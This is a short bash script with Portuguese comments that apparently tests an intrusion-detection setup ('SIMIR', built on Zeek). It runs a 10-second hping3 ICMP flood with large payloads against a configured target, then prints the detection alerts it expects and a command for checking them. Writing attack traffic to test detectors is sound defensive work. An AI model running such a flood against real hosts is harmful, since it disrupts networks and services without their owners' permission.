#!/usr/bin/env bash
source /tmp/target.var

echo "[+] Starting ICMP Flood Attack"
echo "[+] Target: ${TARGET_HOST}"
echo "[+] Attack details:"
echo "    - Tool: hping3"
echo "    - Duration: 10 seconds"
echo "    - Payload: 1200 bytes"
echo "    - Mode: Flood (maximum speed)"
echo ""

# hping3 com flood mode:
# -1 = ICMP mode
# -d 1200 = payload de 1200 bytes
# --flood = envia pacotes o mais rápido possível
# --rand-source = randomiza source (opcional, comentado para manter source real)
timeout 10 hping3 -1 -d 1200 --flood ${TARGET_HOST} 2>&1 | grep -E "statistic|packets" | head -5

# Aguardar um pouco para o Zeek processar
sleep 3

echo ""
echo "[+] Attack completed!"
echo "[+] Generated high-volume ICMP flood with large payloads"
echo ""
echo "[+] Expected SIMIR Detection:"
echo "    - ICMP_High_Volume (>1 MB ICMP traffic)"
echo "    - ICMP_Large_Payload (if payload size detected)"
echo ""
echo "[+] Verify detection:"
echo "    docker exec SIMIR_Z grep 'ICMP' /usr/local/zeek/spool/zeek/notice.log"